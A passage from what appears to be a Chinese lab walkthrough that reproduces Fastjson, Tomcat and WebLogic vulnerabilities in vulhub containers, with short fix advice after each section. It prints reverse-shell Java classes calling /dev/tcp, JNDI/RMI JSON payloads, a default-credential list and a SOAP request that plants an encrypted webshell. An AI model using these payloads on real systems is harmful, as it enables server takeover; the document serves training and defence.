-m http.server<br><img src="http://120.48.107.243:9090/blog/2023/04/03/fdd361713f734b5cb99da3cacdb1e6d7.png" alt="在这里插入图片描述"><br>我们借助marshalsec项目，启动一个RMI服务器，监听9999端口，并制定加载远程类poc.class<br>java8 -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer “<a href="http://192.168.23.133:8000/#poc&quot;">http://192.168.23.133:8000/#poc&quot;</a> 9999<br>补充：http地址为前面开启监听的地址<br>格式为什么会有一个#, 因为是固定格式<br>访问靶场<br><a href="http://192.168.23.132:8090/">http://192.168.23.132:8090/</a><br><img src="http://120.48.107.243:9090/blog/2023/04/03/fea45c0674f549a9bb262a8fc0f8743a.png" alt="在这里插入图片描述"><br>浏览器设置代理，开启bp抓包 ， 发送到重发器，并修改GET–&gt;POST<br>payload<br>{<br>    “b”:{<br>        “@type”:”com.sun.rowset.JdbcRowSetImpl”,<br>        “dataSourceName”:”rmi:&#x2F;&#x2F;192.168.23.133:9999&#x2F;poc”,<br>        “autoCommit”:true<br>    }<br>}<br><img src="http://120.48.107.243:9090/blog/2023/04/03/ecfcc6e5f14a4eb5a65dc10ff885a1b8.png" alt="在这里插入图片描述"><br>可以看到请求已经接收到了，dnslog也回显了<br><img src="http://120.48.107.243:9090/blog/2023/04/03/688ab91a023e4b3abab7dd9171f000f6-20230403125657828.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/0acc3fd5fad4455085ee2f84d914693a.png" alt="在这里插入图片描述"><br><img src="http://120.48.107.243:9090/blog/2023/04/03/94969797292341aa928d4b7e5949204f.png" alt="在这里插入图片描述"></p><h3 id="（6）漏洞利用"><a href="#（6）漏洞利用" class="headerlink" title="（6）漏洞利用"></a>（6）漏洞利用</h3><p>只需要把之前的poc.java要执行的命令修改一下<br>反弹shell，exp.java文件</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"><span class="keyword">import</span> java.lang.Process;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">exp</span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Runtime</span> <span class="variable">rt</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">            String[] commands = &#123;<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;-c&quot;</span> ,<span class="string">&quot;bash -i &gt;&amp; /dev/tcp/192.168.23.133/5656 0&gt;&amp;1&quot;</span>&#125;;</span><br><span class="line">            <span class="type">Process</span> <span class="variable">pc</span> <span class="operator">=</span> rt.exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">// do nothing</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>javac8 exp.java<br>开启http服务<br>python3 -m http.server<br>nc监听<br>nc -lvnp 5656<br>开启rmi<br>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer “<a href="http://192.168.23.133:8000/#exp&quot;">http://192.168.23.133:8000/#exp&quot;</a> 9999<br>payload<br>{<br>    “b”:{<br>        “@type”:”com.sun.rowset.JdbcRowSetImpl”,<br>        “dataSourceName”:”rmi:&#x2F;&#x2F;192.168.23.133:9999&#x2F;exp”,<br>        “autoCommit”:true<br>    }<br>}<br><img src="http://120.48.107.243:9090/blog/2023/04/03/5ca97803b2574de9896a931f35149542.png" alt="在这里插入图片描述"><br>成功收到反弹的shell<br><img src="http://120.48.107.243:9090/blog/2023/04/03/51c0eae233274387bd88f2a8d8b6a709.png" alt="在这里插入图片描述"></p><h2 id="2、-1-2-47反序列化-rce"><a href="#2、-1-2-47反序列化-rce" class="headerlink" title="2、 1.2.47反序列化_rce"></a>2、 1.2.47反序列化_rce</h2><h3 id="（1）漏洞介绍-1"><a href="#（1）漏洞介绍-1" class="headerlink" title="（1）漏洞介绍"></a>（1）漏洞介绍</h3><p>Fastjson是阿里巴巴公司开源的一款json解析器，其性能优越，被广泛应用于各大厂商的Java项目中。fastjson于1.2.24版本后增加了反序列化白名单，而在1.2.48以前的版本中，攻击者可以利用特殊构造的json字符串绕过白名单检测，成功执行任意命令<br>###（2）影响版本<br>Fastjson &lt;&#x3D; 1.2.47<br>###（3）环境搭建<br>vulhub-master&#x2F;fastjson&#x2F;1.2.47-rce<br>docker-compose up -d<br>###（4）漏洞复现<br>新建文件exp.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"><span class="keyword">import</span> java.lang.Process;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">exp</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Runtime</span> <span class="variable">rt</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">             String[] commands = &#123;<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;-c&quot;</span> ,<span class="string">&quot;bash -i &gt;&amp;/dev/tcp/192.168.23.133/5656 0&gt;&amp;1&quot;</span>&#125;;</span><br><span class="line">            <span class="type">Process</span> <span class="variable">pc</span> <span class="operator">=</span> rt.exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">// do nothing</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>javac8 exp.java<br>开启http服务<br>python3 -m http.server<br>nc监听<br>nc -lvnp 5656<br>开启rmi<br>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer “<a href="http://192.168.23.133:8000/#exp&quot;">http://192.168.23.133:8000/#exp&quot;</a> 9999<br>浏览器设置代理，开启bp抓包 ， 发送到重发器，并修改GET–&gt;POST<br>Content-Type: application&#x2F;json<br><a href="http://192.168.23.133:8090/">http://192.168.23.133:8090/</a><br>payload<br>{<br>    “a”:{<br>        “@type”:”java.lang.Class”,<br>        “val”:”com.sun.rowset.JdbcRowSetImpl”<br>    },<br>    “b”:{<br>        “@type”:”com.sun.rowset.JdbcRowSetImpl”,<br>        “dataSourceName”:”rmi:&#x2F;&#x2F;192.168.23.133:9999&#x2F;exp”,<br>        “autoCommit”:true<br>    }<br>}<br><img src="http://120.48.107.243:9090/blog/2023/04/03/a7f6562cf274435d903d61f8f39ffc63.png" alt="在这里插入图片描述"><br>成功接收到请求和反弹的shell<br><img src="http://120.48.107.243:9090/blog/2023/04/03/60e058ba43224e3b9815a11b7338ffa0.png" alt="在这里插入图片描述"><br><img src="http://120.48.107.243:9090/blog/2023/04/03/3e25f1f002744a1eb79a2393d2b8651a.png" alt="在这里插入图片描述"><br><img src="http://120.48.107.243:9090/blog/2023/04/03/74d886393bf1438dba37c3749a8d8a43.png" alt="在这里插入图片描述"><br>修复建议<br>升级版本<br>推荐工具<br>BurpFastJsonScan-1.0.8.jar<br>fastjson_tool.jar</p><h1 id="二、Tomcat"><a href="#二、Tomcat" class="headerlink" title="二、Tomcat"></a>二、Tomcat</h1><h2 id="1、Tomcat介绍"><a href="#1、Tomcat介绍" class="headerlink" title="1、Tomcat介绍"></a>1、Tomcat介绍</h2><p>tomcat是一个开源而且免费的jsp服务器，属于轻量级应用服务器。它可以实现JavaWeb程序的装载，是配置JSP（Java Server Page）和JAVA系统必备的一款环境<br>简单介绍一些tomcat的目录结构<br>|– webapp # 站点根目录<br>    |– META-INF # META-INF 目录<br>    | <code>-- MANIFEST.MF # 配置清单文件     |-- WEB-INF # WEB-INF 目录     | |-- classes # class文件目录     | | |-- *.class # 程序需要的 class 文件     | | </code>– *.xml # 程序需要的 xml 文件<br>    | |– lib # 库文件夹<br>    | | <code>-- *.jar # 程序需要的 jar 包     | </code>– web.xml # Web应用程序的部署描述文件<br>    |– <userdir> # 自定义的目录<br>    |– <userfiles> # 自定义的资源文件<br>webapp：工程发布文件夹。其实每个 war 包都可以视为 webapp 的压缩包。<br>META-INF：META-INF 目录用于存放工程自身相关的一些信息，元文件信息，通常由开发工具，环境自动生<br>成。<br>WEB-INF：Java web应用的安全目录。所谓安全就是客户端无法访问，只有服务端可以访问的目录。<br>&#x2F;WEB-INF&#x2F;classes：存放程序所需要的所有 Java class 文件。<br>&#x2F;WEB-INF&#x2F;lib：存放程序所需要的所有 jar 文件。<br>&#x2F;WEB-INF&#x2F;web.xml：web 应用的部署配置文件。它是工程中最重要的配置文件，它描述了 servlet 和组<br>成应用的其它组件，以及应用初始化参数、安全管理约束等。<br>tomcat 这个 java中间件 , 在历史上也披露出来了很多的漏洞 , 这里我们讲几个经典的漏洞复现</p><h2 id="2、CVE-2017-12615"><a href="#2、CVE-2017-12615" class="headerlink" title="2、CVE-2017-12615"></a>2、CVE-2017-12615</h2><p>tomcat put方法任意文件写入漏洞<br>漏洞描述<br>当 Tomcat运行在Windows操作系统时，且启用了HTTP PUT请求方法（例如，将 readonly 初始化参数由默认值设置为 false），攻击者将有可能可通过精心构造的攻击请求数据包向服务器上传包含任意代码的 JSP 文件，JSP文件中的恶意代码将能被服务器执行。导致服务器上的数据泄露或获取服务器权限。<br>漏洞原理<br>当在Tomcat的conf（配置目录下）&#x2F;web.xml配置文件中添加readonly设置为false时，将导致该漏洞产生，（需要允许put请求） , 攻击者可以利用PUT方法通过精心构造的数据包向存在漏洞的服务器里面上传jsp一句话文件，从而造成远程命令执行，getshell等。<br>默认端口 : 8080<br>影响范围<br>影响范围： Apache Tomcat 7.0.0 - 7.0.79 Apache Tomcat&#x2F;8.5.19<br>环境搭建<br>cd vulhub-master&#x2F;tomcat&#x2F;CVE-2017-12615<br>docker-compose up -d<br>漏洞复现<br><a href="http://192.168.23.133:8080/">http://192.168.23.133:8080/</a><br><img src="http://120.48.107.243:9090/blog/2023/04/03/146dfd2f55f54906b764d6428991ba20.png" alt="在这里插入图片描述"><br>首页抓包，修改为 PUT 方式提交，并写入冰蝎马 , 默认直接 PUT会失败 , 需要绕过<br>PUT &#x2F;shell.jsp%20<br>PUT &#x2F;shell.jsp::$DATA<br>PUT &#x2F;shell.jsp&#x2F;<br><img src="http://120.48.107.243:9090/blog/2023/04/03/8307da1fdd7d4775a9f57a2b0373c119.png" alt="在这里插入图片描述"><br>冰蝎连接<br><a href="http://192.168.23.133:8080/shell.jsp">http://192.168.23.133:8080/shell.jsp</a><br>rebeyond<br><img src="http://120.48.107.243:9090/blog/2023/04/03/8d05da14f3a0475498121a73da37b771.png" alt="在这里插入图片描述"><br>漏洞修复<br>设置 readonly为true</p><h2 id="3、Tomcat弱口令-amp-部署war包-getshell"><a href="#3、Tomcat弱口令-amp-部署war包-getshell" class="headerlink" title="3、Tomcat弱口令&amp;部署war包 getshell"></a>3、Tomcat弱口令&amp;部署war包 getshell</h2><p>漏洞原理<br>在tomcat8环境下默认进入后台的密码为 tomcat&#x2F;tomcat ，未修改造成未授权即可进入后台，或者管理员把密码设置成弱口令。<br>使用工具对其进行穷举，得到密码后，也可以进行后台上传恶意代码控制服务器<br>影响范围<br>全版本<br>前提是人家存在弱口令<br> 环境搭建<br>cd vulhub-master&#x2F;tomcat&#x2F;tomcat8<br>docker-compose up -d<br>漏洞复现<br><a href="http://192.168.23.133:8080/manager/html">http://192.168.23.133:8080/manager/html</a><br>默认密码：tomcat&#x2F;tomcat<br>补充:<br>其他弱口令<br>admin:admin<br>ADMIN:ADMIN<br>admin:j5Brn9<br>admin:None<br>admin:tomcat<br>cxsdk:kdsxc<br>j2deployer:j2deployer<br>ovwebusr:OvW*busr1<br>QCC:QLogic66<br>role:changethis<br>role1:role1<br>role1:tomcat<br>root:root<br>tomcat:changethis<br>tomcat:s3cret<br>tomcat:tomcat<br>xampp:xampp<br><img src="http://120.48.107.243:9090/blog/2023/04/03/95e337b754f3444ab340a1612655cf79.png" alt="在这里插入图片描述"><br>制作war包， 将jsp木马压缩为zip，然后修改后缀为war就可以了。这里仍然使用冰蝎马<br><img src="http://120.48.107.243:9090/blog/2023/04/03/6bf244c07114df5ea9f7c52b3f678dc0.png" alt="image-20220905172926257"><br>默认会在网站根目录下生成一个和war名一致的路径 , 然后马的文件名为压缩前的文件名<br><a href="http://192.168.23.133:8080/shell/shell.jsp">http://192.168.23.133:8080/shell/shell.jsp</a><br>rebeyond<br><img src="http://120.48.107.243:9090/blog/2023/04/03/0f537ab67aa3497a8fb2f1f4b15705dc.png" alt="在这里插入图片描述"><br>漏洞修复</p><ol><li>设置强口令：<br>conf&#x2F;tomcat-users.xml  <user username="tomcat" password="tomcat" roles="manager-gui,managerscript,manager-jmx,manager-status,admin-gui,admin-script" /></li><li>删除manger文件</li></ol><h2 id="4、CVE-2019-0232"><a href="#4、CVE-2019-0232" class="headerlink" title="4、CVE-2019-0232"></a>4、CVE-2019-0232</h2><p>tomcat 远程代码执行漏洞<br>漏洞描述<br>该漏洞与之前Oracle发布的mxRemoteLifecycleListener反序列化漏洞（CVE-2016-3427）相关，是由于使用了JmxRemoteLifecycleListener的监听功能所导致。而在Oracle官方发布修复后，Tomcat未能及时修复更新而导致的远程代码执行。<br>该漏洞所造成的最根本原因是Tomcat在配置JMX做监控时使用了JmxRemoteLifecycleListener的方法。<br>影响范围<br>Apache Tomcat 9.0.0.M1 到 9.0.17<br>Apache Tomcat 8.5.0 到 8.5.39<br>Apache Tomcat 7.0.0 到 7.0.93<br>利用前提<br>1.Windows系统<br>2.启用CGIServlet和enableCmdLineArguments参数<br>3.privileged&#x3D;”true”<br><a href="http://ip:port/cgi-bin/hello.bat?&amp;dir">http://ip:port/cgi-bin/hello.bat?&amp;dir</a><br><img src="http://120.48.107.243:9090/blog/2023/04/03/a3a83124ce954c8cbae8da6e1755fcf0.png" alt="在这里插入图片描述"><br>漏洞修复</p><ol><li>禁用enableCmdLineArguments参数。</li><li>在conf&#x2F;web.xml中覆写采用更严格的参数合法性检验规则。</li><li>升级tomcat到9.0.17以上版本。</li></ol><h2 id="5、CVE-2020-1938"><a href="#5、CVE-2020-1938" class="headerlink" title="5、CVE-2020-1938"></a>5、CVE-2020-1938</h2><p>Apache Tomcat 文件包含漏洞<br>漏洞描述<br>由于 Tomcat AJP 协议设计上存在缺陷，攻击者通过 Tomcat AJP Connector 可以读取或包含 Tomcat 上所有 webapp 目录下的任意文件，例如可以读取 webapp 配置文件或源代码。此外在目标应用有文件上传功能的情况下，配合文件包含的利用还可以达到远程代码执行的危害。<br>影响范围<br>Apache Tomcat 6<br>Tomcat 7系列 &lt;7.0.100<br>Tomcat 8系列 &lt; 8.5.51<br>Tomcat 9 系列 &lt;9.0.31<br>环境搭建<br>cd vulhub-master&#x2F;tomcat&#x2F;CVE-2020-1938<br>docker-compose up -d<br>漏复现洞<br>tomcat默认的conf&#x2F;server.xml中配置了2个Connector，一个为 8080 的对外提供的HTTP协议端口，另外一个就是默认的 8009 AJP协议端口，两个端口默认均监听在外网ip。<br>poc<br>python2 CVE-2020-1938.py -p 8009 -f &#x2F;WEB-INF&#x2F;web.xml 192.168.23.133<br><img src="http://120.48.107.243:9090/blog/2023/04/03/88a157ec58944d018599bcdbc93294b2.png" alt="在这里插入图片描述"><br>漏洞修复</p><ol><li>更新到最新版本</li><li>关闭AJP服务，修改Tomcat配置文件Service.xml,注释掉。<Connector port="8009" protocol="AJP/1.3" redirectPort="8443" /></li><li>配置ajp配置中的secretRequired跟secret属性来限制认证。</li></ol><h1 id="三、weblogic"><a href="#三、weblogic" class="headerlink" title="三、weblogic"></a>三、weblogic</h1><h2 id="1、weblogic介绍"><a href="#1、weblogic介绍" class="headerlink" title="1、weblogic介绍"></a>1、weblogic介绍</h2><p><strong>WebLogic是美国Oracle公司出品的一个application server，确切的说是一个基于JAVAEE架构的中间件，</strong>WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。将Java的动态功能和Java Enterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之中。 </p><h2 id="2、weblogic-后台弱口令getshell"><a href="#2、weblogic-后台弱口令getshell" class="headerlink" title="2、weblogic 后台弱口令getshell"></a>2、weblogic 后台弱口令getshell</h2><p>漏洞描述</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">通过弱口令进入后台界面 , 上传部署war包 , getshell</span><br></pre></td></tr></table></figure><p>影响范围</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">全版本</span><br></pre></td></tr></table></figure><p>环境搭建</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd  vulhub-master/weblogic/weak_password</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p>漏洞复现</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">默认账号密码：weblogic/Oracle@123</span><br><span class="line">weblogic常用弱口令：https://cirt.net/passwords?criteria=weblogic</span><br><span class="line">这里注意， 单个账号错误密码5次之后就会自动锁定。  </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.23.133:7001/console/login/LoginForm.jsp</span><br></pre></td></tr></table></figure><p><img src="http://120.48.107.243:9090/blog/2023/04/03/deb9b978b30445b5a7a0f98c6f976df0.png" alt="在这里插入图片描述"><br>登录后台后，点击部署，点击安装，点击上传文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">weblogic</span><br><span class="line">Oracle@123</span><br></pre></td></tr></table></figure><p><img src="http://120.48.107.243:9090/blog/2023/04/03/a8fbc3277b4a372af855cda00f8b2eaa.png" alt="image-20220906152108629"></p><p><img src="http://120.48.107.243:9090/blog/2023/04/03/5eb60fec207c9c5d72400ae9b21a8a5c.png" alt="image-20220906152154103"></p><p><img src="http://120.48.107.243:9090/blog/2023/04/03/eb3bc1f6d2093d9ac333272a3c8e69a3.png" alt="image-20220906152249570"></p><p>上传war包，jsp木马压缩成zip，修改后缀为war，上传</p><p><img src="http://120.48.107.243:9090/blog/2023/04/03/45d42fda92e3ad929319fab50c70a132.png" alt="image-20220906152342868"></p><p><img src="http://120.48.107.243:9090/blog/2023/04/03/9d13ba838373dca0b500f3fc50f8fb0a.png" alt="image-20220906152353027"></p><p><img src="http://120.48.107.243:9090/blog/2023/04/03/f1c75ce0920a4d571bd0c5a6321a80b9.png" alt="image-20220906152404787"></p><p><img src="http://120.48.107.243:9090/blog/2023/04/03/8320944d99b761de8c3e65cf7fa75b8e.png" alt="image-20220906152438893"></p><p><img src="http://120.48.107.243:9090/blog/2023/04/03/92b14772c23aec33a795c2663dcc9034.png" alt="image-20220906152453693"></p><p>访问部署好的war</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.23.133:7001/shell/shell.jsp</span><br></pre></td></tr></table></figure><p><img src="http://120.48.107.243:9090/blog/2023/04/03/ef86977bb3c54515a123cec85261f35e.png" alt="在这里插入图片描述"><br>使用冰蝎链接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.23.133:7001/shell/shell.jsp</span><br><span class="line">rebeyond</span><br><span class="line">```![在这里插入图片描述](https://img-blog.csdnimg.cn/d6acc04282d9481bb1a070d41e9f1068.png)</span><br><span class="line"></span><br><span class="line">漏洞修复</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>修改弱口令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">##3、CVE-2019-2725</span><br><span class="line"></span><br><span class="line">wls-wsat反序列化漏洞</span><br><span class="line"></span><br><span class="line">漏洞描述</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>WebLogic 反序列化漏洞CVE-2017-3248和WebLogic WLS LS组件的远程代码执行漏洞CVE-2017- 10271，Oracle官方在2017年10月份发布了该漏洞的补丁，但没有公开漏洞细节，如果企业未及时安装补丁，存在被攻击的风险。对企业服务器发起了大范围远程攻击，对大量企业的服务器造成了严重威胁</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">影响范围</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>受影响版本：WebLogic 10.3.6.0.0, 12.1.3.0.0, 12.2.1.1.0, 12.2.1.2.0。 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">环境搭建</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>cd  vulhub-master&#x2F;weblogic&#x2F;weak_password<br>docker-compose up -d</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">漏洞复现</span><br><span class="line"></span><br><span class="line">访问以下目录中的一种，有回显如下图可以判断wls-wsat组件存在</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>&#x2F;wls-wsat&#x2F;CoordinatorPortType<br>&#x2F;wls-wsat&#x2F;RegistrationPortTypeRPC<br>&#x2F;wls-wsat&#x2F;ParticipantPortType<br>&#x2F;wls-wsat&#x2F;RegistrationRequesterPortType<br>&#x2F;wls-wsat&#x2F;CoordinatorPortType11<br>&#x2F;wls-wsat&#x2F;RegistrationPortTypeRPC11<br>&#x2F;wls-wsat&#x2F;ParticipantPortType11<br>&#x2F;wls-wsat&#x2F;RegistrationRequesterPortType11</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><p><a href="http://192.168.1.159:7001/wls-wsat/CoordinatorPortType">http://192.168.1.159:7001/wls-wsat/CoordinatorPortType</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![image-20220906152906944](https://img-blog.csdnimg.cn/img_convert/79faf16dddda81772ce6be80a14a8864.png)</span><br><span class="line"></span><br><span class="line">在当前页面抓包之后，添加下面请求包，在标签之间分别写存放 jsp 的路径和要写入的 shell</span><br><span class="line"></span><br><span class="line">![image-20220906153245494](https://img-blog.csdnimg.cn/img_convert/b785bf4fc81b9736d5604622e3970bd3.png)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>POST &#x2F;wls-wsat&#x2F;CoordinatorPortType HTTP&#x2F;1.1<br>Host: 192.168.1.159:7001<br>User-Agent: Mozilla&#x2F;5.0 (X11; Linux x86_64; rv:60.0) Gecko&#x2F;20100101 Firefox&#x2F;60.0<br>Accept: text&#x2F;hAccept-Encoding: gzip, deflate<br>Accept: <em>&#x2F;</em><br>Accept-Language: en<br>User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64;<br>Trident&#x2F;5.0)<br>Connection: close<br>Content-Type: text&#x2F;xml<br>Content-Length: 1087</p><p>&lt;soapenv:Envelope xmlns:soapenv&#x3D;”<a href="http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;">http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;</a><br><a href="soapenv:Header">soapenv:Header</a><br>&lt;work:WorkContext xmlns:work&#x3D;”<a href="http://bea.com/2004/06/soap/workarea/&quot;&gt;">http://bea.com/2004/06/soap/workarea/&quot;&gt;</a><br><java><java version="1.4.0" class="java.beans.XMLDecoder"><br><object class="java.io.PrintWriter"><br><string>servers&#x2F;AdminServer&#x2F;tmp&#x2F;_WL_internal&#x2F;bea_wls_internal&#x2F;9j4dqk&#x2F;war&#x2F;shell.jsp</string><br><void method="println"><string><br><![CDATA[<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>]]><br></string><br></void><br><void method="close"/><br></object></java></java><br></work:WorkContext><br></soapenv:Header><br><a href="soapenv:Body/">soapenv:Body/</a><br></soapenv:Envelope></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">冰蝎链接shell</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><a href="http://192.168.1.159:7001/bea_wls_internal/shell.jsp">http://192.168.1.159:7001/bea_wls_internal/shell.jsp</a><br>rebeyond</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![image-20220906153404770](https://img-blog.csdnimg.cn/img_convert/17a39075f9069a26ab0808bce3093915.png)</span><br><span class="line">漏洞修复</span><br></pre></td></tr></table></figure><p>更新到最新版本，打上10271的补丁,对访问wls-wsat的资源进行访问控制 ，或者根据业务所有需求，考虑是否删除WLS-WebServices组件。包含此组件路径为： <br>  Middleware&#x2F;user_projects&#x2F;domains&#x2F;base_domain&#x2F;servers&#x2F;AdminServer&#x2F;tmp&#x2F;_WL_internal&#x2F;wls-wsat<br>  Middleware&#x2F;user_projects&#x2F;domains&#x2F;base_domain&#x2F;servers&#x2F;AdminServer&#x2F;tmp&#x2F;.internal&#x2F;wls-wsat.war<br>  Middleware&#x2F;wlserver_10.3&#x2F;server&#x2F;lib&#x2F;wls-wsat.war<br>以上路径都在WebLogic安装处。删除以上文件之后，需重启WebLogic。确认<a href="http://weblogic_ip/wls-w">http://weblogic_ip/wls-w</a> sat&#x2F; 是否为404页面。<br>升级版本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">##4、CVE-2018- 2628</span><br><span class="line"></span><br><span class="line">WebLogic T3协议反序列化命令执行漏洞</span><br><span class="line">漏洞描述</span><br></pre></td></tr></table></figure><p>Weblogic Server中的RMI 通信使用T3协议在Weblogic Server和其它Java程序（客户端或者其它 Weblogic Server实例）之间传输数据, 服务器实例会跟踪连接到应用程序的每个Java虚拟机（JVM）中, 并创建T3协议通信连接, 将流量传输到Java虚拟机. T3协议在开放WebLogic控制台端口的应用上默认开启， 攻击者可以通过T3协议发送恶意的的反序列化数据, 进行反序列化, 实现对存在漏洞的weblogic组件的远程代码执行攻击。 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">影响范围</span><br></pre></td></tr></table></figure><p>Oracle WebLogic Server10.3.6.0.0<br>Oracle WebLogic Server12.1.3.0.0<br>Oracle WebLogic Server12.2.1.2.0<br>Oracle WebLogic Server12.2.1.3.0</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">环境搭建</span><br></pre></td></tr></table></figure><p>cd  vulhub-master&#x2F;weblogic&#x2F;CVE-2018-2628<br>docker-compose up -d</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">漏洞复现</span><br><span class="line">直接使用利用工具</span><br><span class="line">![在这里插入图片描述](https://img-blog.csdnimg.cn/a2442daf8c334e6a83310e1cd3a25baf.png)</span><br><span class="line">连接shell</span><br></pre></td></tr></table></figure><p><a 